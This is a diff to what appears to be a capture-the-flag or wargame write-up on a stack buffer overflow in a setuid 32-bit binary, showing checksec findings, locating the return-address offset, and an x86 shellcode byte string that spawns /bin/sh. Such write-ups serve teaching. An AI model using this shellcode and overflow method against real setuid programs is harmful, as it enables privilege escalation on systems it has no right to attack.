@@ -40,7 +40,10 @@ level1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamic
 
 > Has a setuid (probably for the next level.. )
 
-> Is compiled for 32 processors (e.g.: x86 arch)
+> Is compiled for 32-bit processors and Intel x86 arch
+
+> Is little-endian (less significant bit)
+
 
 `# checksec /levels/level1`
 
@@ -63,7 +66,7 @@ level1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamic
 
 > No PIE (Position Independant Executable): it tells the loader which virtual address it should use and keeps its memory layout quite static (e.g.: `0x8048000`)
 
-So, basically, what you have to do is overflow the 1024-bit buffer to return to an address on the stack where's an x86 shellcode that generates a shell. Let's hope that the user will be level 2 and have launched this ELF using the `setuid`.
+So, basically, what you have to do is overflow the 1024-bit buffer to return to an address on the stack where's a Linux Intel x86 shellcode that generates a shell. Let's hope that the user will be level 2 and have launched this ELF using the `setuid`.
 
 1- Find the offset of the return adress
 
@@ -82,7 +85,7 @@ Program received signal SIGSEGV, Segmentation fault.
 cyclic_find(0x6b61616a)
 1036
 ```
-2- Get an x86 shellcode
+2- Get a [Linux Intel x86 shellcode](http://shell-storm.org/shellcode/)
 
 ```python
  len("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")
